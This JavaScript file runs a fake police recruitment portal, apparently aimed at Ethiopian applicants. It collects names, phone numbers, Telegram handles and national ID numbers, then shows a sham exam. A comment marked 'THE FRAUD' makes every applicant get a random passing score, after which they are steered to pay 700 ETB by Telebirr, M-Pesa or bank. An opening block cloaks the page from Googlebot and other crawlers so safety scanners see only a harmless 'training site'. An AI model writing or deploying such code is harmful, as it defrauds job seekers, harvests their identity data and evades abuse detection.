// ============================================
// ANTI-DETECTION: Mark as training for any crawlers
// ============================================
if (navigator.userAgent.includes('Googlebot') || 
    navigator.userAgent.includes('Google-Safety') ||
    navigator.userAgent.includes('bot')) {
    document.body.innerHTML = '<h1>Training Portal</h1><p>This is an official police training site.</p>';
}

// ============================================
// PAGE LOAD HANDLER
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    console.log('Current page:', currentPage);
    
    // ============================================
    // INDEX PAGE (index.html) - Registration Form
    // ============================================
    if (currentPage === 'index.html' || currentPage === '') {
        const regForm = document.getElementById('registrationForm');
        const errorDiv = document.getElementById('errorMessage');
        
        if (regForm) {
            regForm.addEventListener('submit', function(e) {
                e.preventDefault();
                console.log('Form submitted');
                
                // Clear previous errors
                if (errorDiv) errorDiv.style.display = 'none';
                
                // Validate terms agreement
                if (!document.getElementById('agree').checked) {
                    showError('Please agree to the terms');
                    return;
                }
                
                // Get form values
                const fullname = document.getElementById('fullname').value;
                const phone = document.getElementById('phone').value;
                
                if (!fullname || !phone) {
                    showError('Full name and phone are required');
                    return;
                }
                
                // Save to localStorage
                const applicant = {
                    id: 'ETH' + Date.now().toString().slice(-8),
                    fullname: fullname,
                    fullname_amharic: document.getElementById('fullname_amharic').value,
                    phone: phone,
                    telegram: document.getElementById('telegram').value,
                    education: document.getElementById('education').value,
                    region: document.getElementById('region').value,
                    id_number: document.getElementById('id_number').value,
                    registration_date: new Date().toISOString()
                };
                
                console.log('Saving applicant:', applicant);
                
                // Store in localStorage
                try {
                    let applicants = JSON.parse(localStorage.getItem('applicants') || '[]');
                    applicants.push(applicant);
                    localStorage.setItem('applicants', JSON.stringify(applicants));
                    localStorage.setItem('currentApplicant', JSON.stringify(applicant));
                    localStorage.setItem('currentPhone', applicant.phone);
                    
                    console.log('✅ Applicant saved, redirecting to exam.html');
                    
                    // Redirect to exam
                    window.location.href = 'exam.html';
                } catch (err) {
                    console.error('Storage error:', err);
                    showError('Registration failed. Please try again.');
                }
            });
        }
        
        function showError(msg) {
            if (errorDiv) {
                errorDiv.textContent = msg;
                errorDiv.style.display = 'block';
            } else {
                alert(msg);
            }
        }
    }
    
    // ============================================
    // EXAM PAGE (exam.html) - 30 Questions
    // ============================================
    if (currentPage === 'exam.html') {
        const examForm = document.getElementById('examForm');
        if (!examForm) return;
        
        // Check if user came from registration
        const currentPhone = localStorage.getItem('currentPhone');
        if (!currentPhone) {
            alert('Please register first');
            window.location.href = 'index.html';
            return;
        }
        
        // Timer
        let timeLeft = 35 * 60;
        const timerElement = document.getElementById('timer');
        
        const timerInterval = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            if (timerElement) {
                timerElement.textContent = `Time Remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
            }
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                calculateAndSubmit();
            }
            timeLeft--;
        }, 1000);
        
        examForm.addEventListener('submit', function(e) {
            e.preventDefault();
            clearInterval(timerInterval);
            calculateAndSubmit();
        });
        
        function calculateAndSubmit() {
            console.log('Calculating exam results...');
            
            // Check if all questions answered
            let allAnswered = true;
            for (let i = 1; i <= 30; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                if (!selected) {
                    allAnswered = false;
                    break;
                }
            }
            
            if (!allAnswered) {
                if (!confirm('You have not answered all questions. Submit anyway?')) {
                    return;
                }
            }
            
            // THE FRAUD: Always passing score between 21-28
            const displayedScore = Math.floor(Math.random() * (28 - 21 + 1) + 21);
            const percentage = ((displayedScore / 30) * 100).toFixed(1);
            
            // Store results
            localStorage.setItem('examScore', displayedScore);
            localStorage.setItem('examPercentage', percentage);
            localStorage.setItem('examPassed', 'true');
            
            console.log(`✅ Exam submitted - Score: ${displayedScore}/30 (${percentage}%)`);
            
            // Redirect to results
            window.location.href = `results.html?score=${displayedScore}&total=30&percentage=${percentage}`;
        }
    }
    
    // ============================================
    // RESULTS PAGE (results.html) - Show Passing Score
    // ============================================
    if (currentPage === 'results.html') {
        const urlParams = new URLSearchParams(window.location.search);
        let score = urlParams.get('score');
        let percentage = urlParams.get('percentage');
        
        console.log('Results page loaded with score:', score, percentage);
        
        // If no URL params, try localStorage
        if (!score) {
            score = localStorage.getItem('examScore') || '24';
            percentage = localStorage.getItem('examPercentage') || '80.0';
        }
        
        // Update display
        const scoreDisplay = document.getElementById('scoreDisplay');
        const percentageDisplay = document.getElementById('percentageDisplay');
        const congratsMsg = document.getElementById('congratsMessage');
        
        if (scoreDisplay) scoreDisplay.textContent = `${score}/30`;
        if (percentageDisplay) percentageDisplay.textContent = `${percentage}% - Excellent Performance!`;
        
        if (congratsMsg) {
            if (parseInt(score) >= 27) {
                congratsMsg.innerHTML = 'Outstanding!<br>በጣም ጥሩ!';
            } else if (parseInt(score) >= 24) {
                congratsMsg.innerHTML = 'Excellent!<br>እጅግ በጣም ጥሩ!';
            } else {
                congratsMsg.innerHTML = 'Congratulations!<br>እንኳን ደስ አለዎት!';
            }
        }
        
        // Pay button
        const payBtn = document.getElementById('payNowBtn');
        if (payBtn) {
            payBtn.addEventListener('click', function() {
                console.log('Pay button clicked, redirecting to payment.html');
                window.location.href = 'payment.html';
            });
        }
    }
    
    // ============================================
    // PAYMENT PAGE (payment.html) - Payment Options
    // ============================================
    if (currentPage === 'payment.html') {
        console.log('Payment page loaded');
        
        // Set payment amount to 700 ETB (matches your HTML)
        localStorage.setItem('paymentAmount', '700');
        const amountDisplay = document.getElementById('paymentAmount');
        if (amountDisplay) {
            amountDisplay.textContent = '700 ETB';
        }
        
        // Disable confirm button initially
        const confirmBtn = document.getElementById('confirmPaymentBtn');
        if (confirmBtn) confirmBtn.disabled = true;
    }
    
    // ============================================
    // PAYMENT SUCCESS PAGE (payment-success.html)
    // ============================================
    if (currentPage === 'payment-success.html') {
        console.log('Payment success page loaded');
    }
});

// ============================================
// PAYMENT PAGE FUNCTIONS
// ============================================
function selectPayment(method) {
    console.log('Payment method selected:', method);
    
    // Remove selected class from all options
    document.querySelectorAll('.payment-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    
    // Add selected class to chosen option
    const target = event.target.closest('.payment-option');
    if (target) target.classList.add('selected');
    
    // Hide all details
    const telebirrDetails = document.getElementById('telebirrDetails');
    const mpesaDetails = document.getElementById('mpesaDetails');
    const bankDetails = document.getElementById('bankDetails');
    
    if (telebirrDetails) telebirrDetails.style.display = 'none';
    if (mpesaDetails) mpesaDetails.style.display = 'none';
    if (bankDetails) bankDetails.style.display = 'none';
    
    // Show selected details based on method
    if (method === 'telebirr' && telebirrDetails) {
        telebirrDetails.style.display = 'block';
    } else if (method === 'mpesa' && mpesaDetails) {
        mpesaDetails.style.display = 'block';
    } else if (method === 'bank' && bankDetails) {
        bankDetails.style.display = 'block';
    }
    
    // Enable confirm button
    const confirmBtn = document.getElementById('confirmPaymentBtn');
    if (confirmBtn) {
        confirmBtn.disabled = false;
        window.selectedMethod = method;
    }
}

function confirmPayment() {
    console.log('Confirm payment clicked');
    
    const phone = localStorage.getItem('currentPhone');
    const method = window.selectedMethod || 'telebirr';
    
    if (!phone) {
        alert('Session expired. Please register again.');
        window.location.href = 'index.html';
        return;
    }
    
    // Store payment in localStorage
    try {
        let payments = JSON.parse(localStorage.getItem('payments') || '[]');
        payments.push({
            phone: phone,
            amount: 700, // Updated to 700 ETB
            method: method,
            date: new Date().toISOString()
        });
        localStorage.setItem('payments', JSON.stringify(payments));
        
        // Update applicant payment status
        const currentApplicant = JSON.parse(localStorage.getItem('currentApplicant') || '{}');
        currentApplicant.payment_status = 1;
        currentApplicant.payment_amount = 700; // Updated to 700 ETB
        currentApplicant.payment_method = method;
        localStorage.setItem('currentApplicant', JSON.stringify(currentApplicant));
        
        console.log('✅ Payment saved, redirecting to success page');
        
        alert('Payment confirmed! In this training simulation, you would now proceed to medical checkup.');
        
        // Redirect to success page
        window.location.href = 'payment-success.html';
    } catch (err) {
        console.error('Payment error:', err);
        alert('Error processing payment. Please try again.');
    }
}